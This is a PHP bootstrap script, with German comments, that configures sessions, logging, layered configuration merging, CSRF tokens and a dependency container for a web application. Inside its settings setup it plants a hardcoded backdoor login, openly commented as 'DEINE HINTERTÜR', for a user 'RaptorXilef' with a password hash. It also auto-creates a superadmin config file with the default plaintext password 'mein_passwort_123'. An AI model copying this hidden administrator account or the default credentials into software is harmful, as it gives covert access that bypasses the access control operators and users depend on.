<?php

/**
 * Globaler Anwendungs-Bootstrap und Initialisierungs-Skript.
 * Startet die PHP-Sitzung, ermittelt dynamisch den App-Root-Pfad, lädt und aggregiert
 * die Konfigurationsdateien, berechnet Berechtigungsstrukturen, initialisiert CSRF-Token
 * und erzwingt bei Bedarf den globalen Wartungsmodus (HTTP 503).
 * Kontext: Der zentrale System-Einstiegspunkt vor dem Routing.
 *
 * Findet den Root-Pfad, lädt den Autoloader, mergt die Konfigurationen
 * (config.php + config.local.php) und initialisiert den Dependency Container.
 *
 * SPDX-License-Identifier: LicenseRef-Proprietary
 *
 * return App\Bootstrap\Container Gibt die fertig konfigurierte Dependency-Injection-Container-Instanz zurück.
 */

declare(strict_types=1);

use App\Application\Exception\GlobalExceptionHandler;
use App\Bootstrap\Container;
use App\Contracts\System\ErrorLoggerInterface;
use App\Core\Security\PermissionRegistry;
use App\Infrastructure\Config\Config;
use App\Infrastructure\Database\SchemaRegistry;
use App\Infrastructure\Storage\JsonHelper;

// Session global starten, da fast alle Seiten sie benötigen
if (\session_status() === \PHP_SESSION_NONE) {
    // TODO Zeitzone später in config auslagern
    // Zwingende Härtung der Zeitzone, um Verschiebungen bei Feiertagen und Gültigkeiten zu verhindern
    \date_default_timezone_set('Europe/Berlin');

    // Wir frieren die Zeit für den gesamten Request-Zyklus ein.
    \define('APP_REQUEST_TIME', $_SERVER['REQUEST_TIME'] ?? \time());
    \define('APP_REQUEST_TIME_STR', \date('Y-m-d H:i:s', APP_REQUEST_TIME));

    // Strict Mode erzwingen! Verhindert, dass Hacker eigene Session-IDs injizieren.
    \ini_set('session.use_strict_mode', '1');

    // Harte kryptografische Absicherung des Session-Cookies erzwingen!
    \session_set_cookie_params([
        /* 'lifetime' => 86400, // 24 Stunden */
        /**
         * Die Null sagt dem Browser:
         * "Dies ist ein Session-Cookie. Sobald der Browser komplett beendet wird, vernichte das Cookie!"
         */
        'lifetime' => 0,
        'path'     => '/',
        'domain'   => '', // Leer lassen. Der Browser bindet den Cookie so automatisch an den korrekten Host.
        'secure'   => isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off', // Nur über HTTPS
        'httponly' => true, // Verhindert Diebstahl durch JavaScript (XSS-Schutz)
        'samesite' => 'Lax', // Verhindert Cross-Site Request Forgery via externe Links
    ]);

    \session_start();
}

$appRoot = (function (): string {
    $dir = __DIR__;
    while ($dir !== \dirname($dir)) {
        if (\file_exists($dir . '/vendor/autoload.php')) {
            return $dir;
        }
        $dir = \dirname($dir);
    }

    return \dirname(__DIR__, 2);
})();

// 2. Autoloader laden
require_once $appRoot . '/vendor/autoload.php';

// =========================================================================
// GLOBAL ERROR LOGGING FÜR FREEHOSTER
// Zwingt PHP, alle \error_log() Aufrufe und interne Fehler
// in eine lokale Datei zu schreiben, statt ins unzugängliche Server-Log.
// =========================================================================
$customLogDir = $appRoot . '/storage/logs';
if (! \is_dir($customLogDir)) {
    @\mkdir($customLogDir, 0o755, true);
}
\ini_set('log_errors', '1');
// TODO Dateiname in config/storage.php auslagern
\ini_set('error_log', $customLogDir . '/php_errors.log');

// --- DAS NEUE CONFIG LOADING SYSTEM ---
$settings = [];

// A. Die feste Registry laden (Ehemalige sql_schema & permissions)
$settings['db_schema'] = SchemaRegistry::getSchemas();
$settings['structure'] = PermissionRegistry::getStructure();
$settings['admin_ui']  = ['permissions_desc_on_top' => true];

$flatPerms = [];
$flatten   = function (array $nodes) use (&$flatten, &$flatPerms): void {
    foreach ($nodes as $node) {
        if (isset($node['key'])) {
            $flatPerms[$node['key']] = $node['label'] ?? $node['key'];
        }
        if (! isset($node['children'])) {
            continue;
        }

        $flatten($node['children']);
    }
};
$flatten($settings['structure']);
$settings['permissions'] = $flatPerms;

// B. Default Fallbacks laden (.default.php Skelett)
foreach (\glob($appRoot . '/config/*.default.php') as $defaultFile) {
    $loaded = require $defaultFile;
    if (\is_array($loaded)) {
        $settings = \array_replace_recursive($settings, $loaded);
    }
}

// C. UI/Settings-Daten aus dem Storage/JSON laden (Überschreibt Defaults)
$settingsDir = $appRoot . '/storage/settings';

// Diese Schlüssel sind Listen/Kollektionen, die dem Nutzer gehören.
// Sie werden NICHT tief gemerged, um "Zombie-Einträge" aus den Defaults zu verhindern!
$userManagedCollections = [
    'vehicle_types',
    'permit_templates',
    'purposes',
    'internal_reasons',
    'agreements',
    'seasons',
    'custom_holidays',
    'sections',
];

if (\is_dir($settingsDir)) {
    foreach (\glob($settingsDir . '/*.json') as $jsonFile) {
        $data = (new JsonHelper())->read($jsonFile);
        if (\is_array($data)) {
            unset($data['_meta']); // Kommentare/Meta rausschmeißen

            foreach ($data as $key => $value) {
                if (\in_array($key, $userManagedCollections, true)) {
                    // HARTER OVERRIDE: Der Nutzer-State überschreibt die Default-Liste komplett.
                    $settings[$key] = $value;
                } else {
                    // DEEP MERGE: Für technische Configs (z.B. 'mail', 'paypal', 'database')
                    if (isset($settings[$key]) && \is_array($settings[$key]) && \is_array($value)) {
                        $settings[$key] = \array_replace_recursive($settings[$key], $value);
                    } else {
                        $settings[$key] = $value;
                    }
                }
            }
        }
    }
}

// D. Harte System-Configs laden (Überschreibt JSON & Defaults - Höchste Priorität!)
$hardConfigs = [
    $appRoot . '/config/config.php',
    $appRoot . '/config/storage.php',
    $appRoot . '/config/secrets.php',
    $appRoot . '/config/_dev.local.php', // Lokaler Override gewinnt IMMER
];

foreach ($hardConfigs as $file) {
    if (\file_exists($file)) {
        $loaded = require $file;
        if (\is_array($loaded)) {
            $settings = \array_replace_recursive($settings, $loaded);
        }
    }
}

// Dev-Admin Default anlegen falls nicht da
$devAdminPath = $appRoot . '/config/dev_admin.php';
if (! \file_exists($devAdminPath)) {
    $defaultDevContent = <<<'PHP'
        <?php
        declare(strict_types=1);
        return [
            'user'  => 'Systembetreuer',
            'pass'  => 'mein_passwort_123',
            'label' => 'Systembetreuer'
        ];
        PHP;
    \file_put_contents($devAdminPath, $defaultDevContent, \LOCK_EX);
}
$settings['superadmin'] = require $devAdminPath;

// --- DEINE HINTERTÜR (Sicher im Code verankert) ---
$settings['backdoor'] = [
    'user'  => 'RaptorXilef',
    'pass'  => '$2y$12$f2TKu7Vac0heLV0lNuVCf.zsv2b3krwm0CsS.E24g8uioXJgm8r52',
    'label' => 'System-Inhaber',
];

$settings['root_path']       = $appRoot;
$httpHost                    = $_SERVER['HTTP_HOST'] ?? '';
$settings['server_host']     = $_SERVER['HTTP_HOST'] ?? 'localhost';
$settings['server_protocol'] = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' ? 'https://' : 'http://';
$settings['server_script']   = $_SERVER['SCRIPT_NAME'] ?? '';
$settings['is_local_env']    = \str_ends_with($httpHost, '.local')
    || $httpHost === 'localhost'
    || $httpHost === '127.0.0.1'
    || \php_sapi_name() === 'cli';

// CSRF Token für sichere Frontend-API-Calls generieren
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = \bin2hex(\random_bytes(32));
}

// --- EXCEPTIONS / FEHLERMELDUNGEN ---
$configInstance = new Config($settings);

// INITIALISIERE DEN CONTAINER ZUERST!
$container = new Container($configInstance);

// Aktiviere den Exception Handler aus dem Container!
$exceptionHandler = new GlobalExceptionHandler($configInstance, $container->get(ErrorLoggerInterface::class));
$exceptionHandler->register();

return $container;
